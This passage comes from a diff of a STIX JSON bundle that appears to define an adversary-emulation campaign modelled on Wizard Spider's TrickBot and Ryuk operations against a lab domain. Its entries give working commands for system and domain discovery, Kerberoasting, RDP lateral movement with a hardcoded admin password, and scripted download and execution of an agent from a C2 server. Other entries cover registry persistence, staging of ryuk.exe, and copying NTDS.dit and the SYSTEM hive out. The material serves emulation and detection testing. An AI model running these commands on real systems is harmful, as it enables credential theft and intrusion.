+            "value": "10.0.0.8"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6eff0c10-8ec7-481f-bbfa-00d852df458e",
+            "created": "2024-02-04T22:05:28.160057Z",
+            "modified": "2024-02-04T22:05:28.160057Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--1b21e49a-9550-4616-b125-d790a73165a6"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--4750c01e-98fc-43f8-8178-14bcc66c2cc9",
+            "created": "2024-02-04T22:05:28.160592Z",
+            "modified": "2024-02-04T22:05:28.160592Z",
+            "name": "TrickBot System Information Discovery",
+            "description": "Wizard Spider uses TrickBot to gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim\u2019s machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "cleanup": "del /f discovery.txt",
+                                "command": "systeminfo > discovery.txt"
+                            }
+                        }
+                    },
+                    "technique_name": "System Information Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0caf088b-b0b4-4f5a-8f54-d8df1b0fc461",
+            "created": "2024-02-04T22:05:28.160962Z",
+            "modified": "2024-02-04T22:05:28.160962Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--4750c01e-98fc-43f8-8178-14bcc66c2cc9"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--dc4236df-0484-4763-891a-c2f6ede5293d",
+            "created": "2024-02-04T22:05:28.161332Z",
+            "modified": "2024-02-04T22:05:28.161332Z",
+            "name": "TrickBot System Service Discovery (systeminfo)",
+            "description": "Wizard Spider uses TrickBot to collect a list of installed programs and services on the system\u2019s machine\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1007",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "sc query >> discovery.txt"
+                            }
+                        }
+                    },
+                    "technique_name": "System Service Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--dfcafae9-f227-4088-a163-59d5f316c220",
+            "created": "2024-02-04T22:05:28.161609Z",
+            "modified": "2024-02-04T22:05:28.161609Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--dc4236df-0484-4763-891a-c2f6ede5293d"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--53e87d17-b904-4739-92f0-4b5169d9a1d4",
+            "created": "2024-02-04T22:05:28.161883Z",
+            "modified": "2024-02-04T22:05:28.161883Z",
+            "name": "TrickBot Local Account Discovery",
+            "description": "Wizard Spider uses TrickBot to collect the local users of the system.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1087.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net user >> discovery.txt"
+                            }
+                        }
+                    },
+                    "technique_name": "Account Discovery: Local Account"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f5b186a9-6416-4c58-a7c8-2c5f9bbd015d",
+            "created": "2024-02-04T22:05:28.162189Z",
+            "modified": "2024-02-04T22:05:28.162189Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--53e87d17-b904-4739-92f0-4b5169d9a1d4"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--e639caf1-8987-4aad-b6f1-6a1d186e2ec9",
+            "created": "2024-02-04T22:05:28.162472Z",
+            "modified": "2024-02-04T22:05:28.162472Z",
+            "name": "TrickBot Domain Account Discovery",
+            "description": "Wizard Spider uses TrickBot to collect the domain users of the system.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1087.002",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net user /domain >> discovery.txt"
+                            }
+                        }
+                    },
+                    "technique_name": "Account Discovery: Domain Account"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--34406811-b19e-4a3e-a1a7-3e859d145664",
+            "created": "2024-02-04T22:05:28.162752Z",
+            "modified": "2024-02-04T22:05:28.162752Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--e639caf1-8987-4aad-b6f1-6a1d186e2ec9"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f6de05d2-5ec5-4d27-b19c-f8cf817d6213",
+            "created": "2024-02-04T22:05:28.163057Z",
+            "modified": "2024-02-04T22:05:28.163057Z",
+            "name": "TrickBot System Network Configuration Discovery",
+            "description": "Wizard Spider uses TrickBot to obtain the IP address, location, and other relevant network information from the victim\u2019s machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1016",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "ipconfig /all"
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Configuration Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c92ae7e3-a382-4c5e-a174-4e2b6fc03ff2",
+            "created": "2024-02-04T22:05:28.163327Z",
+            "modified": "2024-02-04T22:05:28.163327Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--f6de05d2-5ec5-4d27-b19c-f8cf817d6213"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--aa1b8eef-2c76-4184-b7a7-2b5c175e49f6",
+            "created": "2024-02-04T22:05:28.163633Z",
+            "modified": "2024-02-04T22:05:28.163633Z",
+            "name": "TrickBot System Network Connections Discovery",
+            "description": "Wizard Spider uses TrickBot to obtain the network connection information from the victim\u2019s machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1049",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "netstat -tan"
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Connections Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--486c1a9c-da7d-4b5c-a077-51aa20c4516d",
+            "created": "2024-02-04T22:05:28.163876Z",
+            "modified": "2024-02-04T22:05:28.163876Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--aa1b8eef-2c76-4184-b7a7-2b5c175e49f6"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--1f30fdc6-88c0-4c69-958d-6101468bd0ec",
+            "created": "2024-02-04T22:05:28.164337Z",
+            "modified": "2024-02-04T22:05:28.164337Z",
+            "name": "TrickBot System Information Discovery (net config)",
+            "description": "Wizard Spider uses TrickBot to gather client specfic information\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net config workstation >> discovery.txt"
+                            }
+                        }
+                    },
+                    "technique_name": "System Information Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--280540ec-fd54-4624-934d-4260649fe6f7",
+            "created": "2024-02-04T22:05:28.164807Z",
+            "modified": "2024-02-04T22:05:28.164807Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--1f30fdc6-88c0-4c69-958d-6101468bd0ec"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ed40220d-9d1f-4191-b73f-54f17278e256",
+            "created": "2024-02-04T22:05:28.165136Z",
+            "modified": "2024-02-04T22:05:28.165136Z",
+            "name": "TrickBot Domain Trust Discovery",
+            "description": "Wizard Spider uses TrickBot to gather domain specfic information\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1482",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "nltest /domain_trusts /all_trusts >> discovery.txt"
+                            }
+                        }
+                    },
+                    "technique_name": "Domain Trust Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5fe0be50-f7ea-4e94-b446-d6aae1088b8a",
+            "created": "2024-02-04T22:05:28.166723Z",
+            "modified": "2024-02-04T22:05:28.166723Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--ed40220d-9d1f-4191-b73f-54f17278e256"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ced2de73-54fa-49ec-b60d-de635dcde620",
+            "created": "2024-02-04T22:05:28.167019Z",
+            "modified": "2024-02-04T22:05:28.167019Z",
+            "name": "TrickBot Permission Groups Discovery",
+            "description": "Wizard Spider uses TrickBot to identify the groups the user on a compromised host belongs to.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1069",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "whoami /groups >> discovery.txt"
+                            }
+                        }
+                    },
+                    "technique_name": "Permission Groups Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f80b8372-22eb-4fa9-9ffc-c12e4cb92cb3",
+            "created": "2024-02-04T22:05:28.167239Z",
+            "modified": "2024-02-04T22:05:28.167239Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--ced2de73-54fa-49ec-b60d-de635dcde620"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--3de63509-4171-488f-8938-ce346677a5a6",
+            "created": "2024-02-04T22:05:28.167589Z",
+            "modified": "2024-02-04T22:05:28.167589Z",
+            "name": "TrickBot Perform Kerberoasting",
+            "description": "Wizard Spider performs Kerberoasting using a public tool, Rubeus. Through Kerberoasting, Wizard Spider obtains encrypted credentials.",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1558.003",
+                    "input_arguments": {
+                        "ad.domain.full_name": {
+                            "default": "oz.local",
+                            "description": "The fully qualified name of the target domain",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "rubeus.exe kerberoast /domain:#{ad.domain.full_name}\n",
+                                "payloads": [
+                                    "rubeus.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cf38045c-a1d7-4581-b94a-84fa7ff3482f",
+            "created": "2024-02-04T22:05:28.16833Z",
+            "modified": "2024-02-04T22:05:28.16833Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--3de63509-4171-488f-8938-ce346677a5a6",
+            "target_ref": "domain-name--dca4c5ab-932f-5202-8956-3c63cb9a7676"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--dca4c5ab-932f-5202-8956-3c63cb9a7676",
+            "value": "oz.local"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d6b9e295-55aa-48f5-b9b7-8fb7b8beb9b6",
+            "created": "2024-02-04T22:05:28.168754Z",
+            "modified": "2024-02-04T22:05:28.168754Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--3de63509-4171-488f-8938-ce346677a5a6"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--dedb77a9-16b9-498c-bd07-074891abd345",
+            "created": "2024-02-04T22:05:28.169117Z",
+            "modified": "2024-02-04T22:05:28.169117Z",
+            "name": "Terminate RDP Session to Second Target (Toto)",
+            "description": "End the RDP session to the second target.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince the RDP connection originates from the attacker's machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1021.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "proc": {
+                                "command": "pkill xfreerdp\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote Services: Remote Desktop Protocol"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--716ee820-601c-4914-9ed0-c32f59c94818",
+            "created": "2024-02-04T22:05:28.169417Z",
+            "modified": "2024-02-04T22:05:28.169417Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--dedb77a9-16b9-498c-bd07-074891abd345"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--b8ad9654-80a1-4fde-b2d4-c0de7648621c",
+            "created": "2024-02-04T22:05:28.169678Z",
+            "modified": "2024-02-04T22:05:28.169678Z",
+            "name": "Prepare Tools for Ingress Tool Transfer (Wizard)",
+            "description": "Prepares the local folder with kill.bat, window.bat, and ryuk.exe to use as the RDP shared-drive.\nThis ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself),\nsince the RDP connection will be from the attacker's machine.\nRequires xdotool to be installed on the running machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1105",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "mkdir -p ws_tools;\ncp kill.bat ./ws_tools/;\ncp window.bat ./ws_tools/;\ncp ryuk.exe ./ws_tools/;\n",
+                                "payloads": [
+                                    "kill.bat",
+                                    "window.bat",
+                                    "ryuk.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--64668b25-702e-4d71-99a3-b898f77fb7cf",
+            "created": "2024-02-04T22:05:28.16992Z",
+            "modified": "2024-02-04T22:05:28.16992Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--b8ad9654-80a1-4fde-b2d4-c0de7648621c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--6b9da996-145e-40b1-935f-6818a89bb561",
+            "created": "2024-02-04T22:05:28.17045Z",
+            "modified": "2024-02-04T22:05:28.17045Z",
+            "name": "Lateral Movement Via RDP (Wizard)",
+            "description": "Uses discovered credentials to RDP into the domain controller.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince the RDP connection must originate from the attacker's machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1021.001",
+                    "input_arguments": {
+                        "ad.domain.name": {
+                            "default": "oz",
+                            "description": "The short name of the target domain",
+                            "type": "string"
+                        },
+                        "dc.target.host": {
+                            "default": "10.0.0.4",
+                            "description": "The hostname or IPv4 address of the domain controller for lateral movement.",
+                            "type": "string"
+                        },
+                        "domain.admin.name": {
+                            "default": "vfleming",
+                            "description": "The name of the domain admin account for lateral movement to the domain controller.",
+                            "type": "string"
+                        },
+                        "domain.admin.password": {
+                            "default": "q27VYN8xflPcYumbLMit",
+                            "description": "The password of the domain admin account for lateral movement to the domain controller.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "linux": {
+                            "proc": {
+                                "command": "exec-background xfreerdp +clipboard /u:#{ad.domain.name}\\\\#{domain.admin.name} /p:\"#{domain.admin.password}\" /v:#{dc.target.host} /drive:X,./ws_tools /cert-ignore\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote Services: Remote Desktop Protocol"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7c3aea8f-3f2d-4f43-b961-d5436bcc842e",
+            "created": "2024-02-04T22:05:28.171325Z",
+            "modified": "2024-02-04T22:05:28.171325Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--6b9da996-145e-40b1-935f-6818a89bb561",
+            "target_ref": "domain-name--1649df47-2de1-5552-ab21-f1584a44e7b0"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--1649df47-2de1-5552-ab21-f1584a44e7b0",
+            "value": "oz"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4fc5eaa2-b006-44e5-ae3d-6ab3db7bb86a",
+            "created": "2024-02-04T22:05:28.172959Z",
+            "modified": "2024-02-04T22:05:28.172959Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--6b9da996-145e-40b1-935f-6818a89bb561",
+            "target_ref": "ipv4-addr--93529ad0-d8ce-5150-982d-45b1523f0d10"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--93529ad0-d8ce-5150-982d-45b1523f0d10",
+            "value": "10.0.0.4"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a3bcd1c6-4d80-44c9-8b12-3fa59506e2aa",
+            "created": "2024-02-04T22:05:28.173766Z",
+            "modified": "2024-02-04T22:05:28.173766Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--6b9da996-145e-40b1-935f-6818a89bb561",
+            "target_ref": "domain-name--566a9e4b-31f4-53ba-90c8-020f89987df7"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--566a9e4b-31f4-53ba-90c8-020f89987df7",
+            "value": "vfleming"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a58997cc-d595-49c7-ae0d-d379259e0929",
+            "created": "2024-02-04T22:05:28.175448Z",
+            "modified": "2024-02-04T22:05:28.175448Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--6b9da996-145e-40b1-935f-6818a89bb561",
+            "target_ref": "user-account--aeb80c16-f759-4265-bf67-39faaa9b97ed"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--aeb80c16-f759-4265-bf67-39faaa9b97ed",
+            "credential": "q27VYN8xflPcYumbLMit"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f30cf1b8-4d83-49b1-9491-771f6fc83b4a",
+            "created": "2024-02-04T22:05:28.176002Z",
+            "modified": "2024-02-04T22:05:28.176002Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--6b9da996-145e-40b1-935f-6818a89bb561"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--7a46a8c9-f46a-481b-8b38-68a3aea68114",
+            "created": "2024-02-04T22:05:28.176322Z",
+            "modified": "2024-02-04T22:05:28.176322Z",
+            "name": "Download and Execute Agent for Lateral Movement (Wizard)",
+            "description": "Downloads a new agent executable and executes it on the domain controller over RDP.\nThis ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself),\nsince the RDP connection will be from the attacker's machine.\nRequires xdotool to be installed on the running machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1105",
+                    "input_arguments": {
+                        "dc.target.host": {
+                            "default": "10.0.0.4",
+                            "description": "The hostname or IPv4 address of the domain controller for lateral movement.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "sleep 30;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:#{dc.target.host}\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nxdotool windowactivate --sync \"$rdp_window\" key Super_L;\nsleep 5; xdotool windowactivate --sync \"$rdp_window\" type --delay 200 \"powershell.exe\";\nsleep 5; xdotool windowactivate --sync \"$rdp_window\" key --clearmodifiers --delay 200 Control_L+Shift_L+Return;\nsleep 10; xdotool windowactivate --sync \"$rdp_window\" key Left;\nsleep 3; xdotool windowactivate --sync \"$rdp_window\" key Return;\nsleep 15; xdotool windowactivate --sync \"$rdp_window\" type --delay 200 '$Body=@{file=\"sandcat.go\";server=\"#{server}\";platform=\"windows\";group=\"wizard\"}';\nsleep 3; xdotool windowactivate --sync \"$rdp_window\" key Return;\nsleep 3; xdotool windowactivate --sync \"$rdp_window\" type --delay 200 'Invoke-WebRequest -Uri #{server}/file/download -OutFile $env:AppData\\uxtheme.exe -Method POST -Headers $Body';\nsleep 3; xdotool windowactivate --sync \"$rdp_window\" key Return;\nsleep 15; xdotool windowactivate --sync \"$rdp_window\" type --delay 200 '& $env:AppData\\uxtheme.exe';\nsleep 3; xdotool windowactivate --sync \"$rdp_window\" key Return;\nsleep 30;\n",
+                                "timeout": 180
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b676c837-ac71-4ced-b983-f85159c56e14",
+            "created": "2024-02-04T22:05:28.177185Z",
+            "modified": "2024-02-04T22:05:28.177185Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--7a46a8c9-f46a-481b-8b38-68a3aea68114",
+            "target_ref": "ipv4-addr--93529ad0-d8ce-5150-982d-45b1523f0d10"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--93529ad0-d8ce-5150-982d-45b1523f0d10",
+            "value": "10.0.0.4"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4df6911d-2279-4166-b83a-536538df1258",
+            "created": "2024-02-04T22:05:28.177507Z",
+            "modified": "2024-02-04T22:05:28.177507Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--7a46a8c9-f46a-481b-8b38-68a3aea68114"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--1536bbcf-858e-44c2-95cb-ebd46d7434be",
+            "created": "2024-02-04T22:05:28.17777Z",
+            "modified": "2024-02-04T22:05:28.17777Z",
+            "name": "Wizard Spider Registry Persistence",
+            "description": "Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1547.004",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "cleanup": "Remove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" -Force\n",
+                                "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, $env:AppData\\uxtheme.exe\" -Force\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--ba23453f-781b-4647-87c9-38f7c2c55235",
+            "created": "2024-02-04T22:05:28.178042Z",
+            "modified": "2024-02-04T22:05:28.178042Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--1536bbcf-858e-44c2-95cb-ebd46d7434be"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--46430565-f9e8-4580-b497-f5f561962d95",
+            "created": "2024-02-04T22:05:28.17847Z",
+            "modified": "2024-02-04T22:05:28.17847Z",
+            "name": "Wizard Spider Domain Group Discovery",
+            "description": "Wizard Spider has used AdFind to enumerate domain computers, including the domain controller.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1069.002",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "adfind -f \"(objectcategory=group)\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Permission Groups Discovery: Domain Groups"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--415bfcd6-ce94-4183-9fcd-8fa146324eee",
+            "created": "2024-02-04T22:05:28.178774Z",
+            "modified": "2024-02-04T22:05:28.178774Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--46430565-f9e8-4580-b497-f5f561962d95"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5746a074-1f51-4a96-8e69-f7eb81578f5e",
+            "created": "2024-02-04T22:05:28.179052Z",
+            "modified": "2024-02-04T22:05:28.179052Z",
+            "name": "Wizard Spider Create Volume Shadow Copy",
+            "description": "Wizard Spider uses vssadmin to create a volume shadow copy in order to collect the active directory database (ntds.dit).\nWizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1003.003",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "cmd /c \"vssadmin.exe create shadow /for=C:\";\n",
+                                "parsers": {
+                                    "plugins.emu.app.parsers.vssadmin_shadow": [
+                                        {
+                                            "source": "vssadmin.shadow_copy.name"
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    },
+                    "technique_name": "OS Credential Dumping: NTDS"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b46d0a0c-47dd-4f9e-92c2-a5d2bef7ca3c",
+            "created": "2024-02-04T22:05:28.179337Z",
+            "modified": "2024-02-04T22:05:28.179337Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--5746a074-1f51-4a96-8e69-f7eb81578f5e"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--05202302-6b80-4549-b3bb-2ead90c249a5",
+            "created": "2024-02-04T22:05:28.179685Z",
+            "modified": "2024-02-04T22:05:28.179685Z",
+            "name": "Wizard Spider Exfil Volume Shadow Copy",
+            "description": "Wizard Spider exfiltrates the shadow copy files using an RDP-mounted network share.\nWizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1003.003",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "cmd /c \"copy #{vssadmin.shadow_copy.name}\\Windows\\NTDS\\NTDS.dit \\\\TSCLIENT\\X\\ntds.dit\";\ncmd /c \"copy #{vssadmin.shadow_copy.name}\\Windows\\System32\\config\\SYSTEM \\\\TSCLIENT\\X\\VSC_SYSTEM_HIVE\";\n"
+                            }
+                        }
+                    },
+                    "technique_name": "OS Credential Dumping: NTDS"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8153a019-21af-4cbb-9ba5-3d8a0b10d00b",
+            "created": "2024-02-04T22:05:28.180451Z",
+            "modified": "2024-02-04T22:05:28.180451Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--05202302-6b80-4549-b3bb-2ead90c249a5"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--bb98782b-2519-4721-a723-b8f027b441d4",
